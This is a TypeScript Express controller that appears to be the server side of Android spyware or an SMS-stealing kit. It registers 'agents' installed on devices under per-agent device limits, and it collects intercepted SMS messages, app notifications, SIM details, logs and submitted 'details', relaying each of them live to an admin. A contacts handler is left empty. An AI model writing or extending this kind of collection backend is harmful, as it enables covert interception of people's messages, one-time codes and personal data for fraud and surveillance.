import {Request, Response} from "express";
import {respondSuccess, respondSuccessWithData} from "../utils/response";
import AgentModel, {IAgent} from "../models/agent.model";
import InstalledAgentModel, {IInstalledAgent} from "../models/installedAgent.model";
import {getPreferredTime} from "../utils/time";
import Message from "../models/message.model";
import Notification, {INotification} from "../models/notification.model";
import {writeDeviceLog} from "../utils/logger";
import Detail, {IDetail} from "../models/detail.model";

export const initAgent = async (req: Request, res: Response) => {
    let {adminID, agentName, agentID, deviceID, deviceName, apiLevel, simDetails} = req.body;

    let agent: IAgent | null = await AgentModel.findOne({agentID});

    if (!agent || agent.status === "suspended") {
        return respondSuccessWithData(res, {status: "suspended"});
    }

    if (agent.maxDevices !== 0 && agent.totalDevices >= agent.maxDevices) {
        return respondSuccessWithData(res, {status: "max-devices"});
    }

    let deviceCheck: IInstalledAgent | null = await InstalledAgentModel.findOne({deviceID});
    if (deviceCheck) {
        if (deviceCheck.status === "suspended") {
            return respondSuccessWithData(res, {status: "suspended"});
        }
        if (simDetails) {
            deviceCheck.simInfo = simDetails;
            await deviceCheck.save();
        }
        return respondSuccess(res);
    }

    agent.totalDevices++;

    await agent.save();

    let installedAgent = new InstalledAgentModel({
        deviceID,
        agentName,
        agentID,
        adminID,
        deviceName,
        apiLevel,
        installedAt: getPreferredTime()
    });
    await installedAgent.save();

    if (connectedUsers[adminID]) {
        io.to(connectedUsers[adminID]).emit("onNewAgentAdded", agentName, agentID, adminID, deviceName, deviceID)
    }

    return respondSuccess(res);
};

export const saveSMS = async (req: Request, res: Response) => {
    let {adminID, agentID, message, sender, deviceID} = req.body;

    let time = getPreferredTime();
    let messageDoc = new Message({adminID, agentID, deviceID, message, sender, time});

    await messageDoc.save();

    if (connectedUsers[adminID]) {
        io.to(connectedUsers[adminID]).emit("newMessage-" + deviceID, {
            adminID,
            agentID,
            message,
            sender,
            deviceID,
            time
        });
    }

    respondSuccess(res);
}

export const saveNotification = async (req: Request, res: Response) => {
    let {adminID, agentID, deviceID, appName, title, text} = req.body;

    let time = getPreferredTime();

    let doc: INotification | null = await Notification.findOne({adminID, agentID, deviceID, appName, title});
    if (doc) {
        if (doc.time != time) {
            doc.time = time;
            await doc.save();
        }
        return respondSuccess(res);
    }
    let notification = new Notification({adminID, agentID, deviceID, appName, title, text, time});

    await notification.save();

    if (connectedUsers[adminID]) {
        io.to(connectedUsers[adminID]).emit("newNotification-" + deviceID, {
            adminID,
            agentID,
            deviceID,
            appName,
            title,
            text,
            time
        });
    }

    respondSuccess(res);
}

export const saveLog = async (req: Request, res: Response) => {
    try {
        const {deviceID, log} = req.body;
        if (!deviceID || !log) {
            return res.status(400).json({error: "deviceID and log are required"});
        }

        const time = getPreferredTime();
        writeDeviceLog(deviceID, log, time);

        return res.json({success: true, message: "Log saved successfully"});
    } catch (error) {
        console.error("Error saving log:", error);
        return res.status(500).json({error: "Failed to save log"});
    }
};

export const saveDetails = async (req: Request, res: Response) => {
    let {agentID, adminID, deviceID, details, submissionID} = req.body;

    if (connectedUsers[adminID]) {
        io.to(connectedUsers[adminID]).emit("new-details-" + deviceID, details);
    }

    let doc: IDetail | null = await Detail.findOne({submissionID}).lean();

    if (doc) {
        await Detail.updateOne({submissionID}, {$set: {details: {...doc.details, ...details}}});
        return respondSuccess(res);
    }

    let detail = new Detail({
        agentID, adminID, deviceID, details, submissionID, time: getPreferredTime()
    });

    await detail.save();

    return respondSuccess(res);
}

export const saveContacts = async (req: Request, res: Response) => {

}

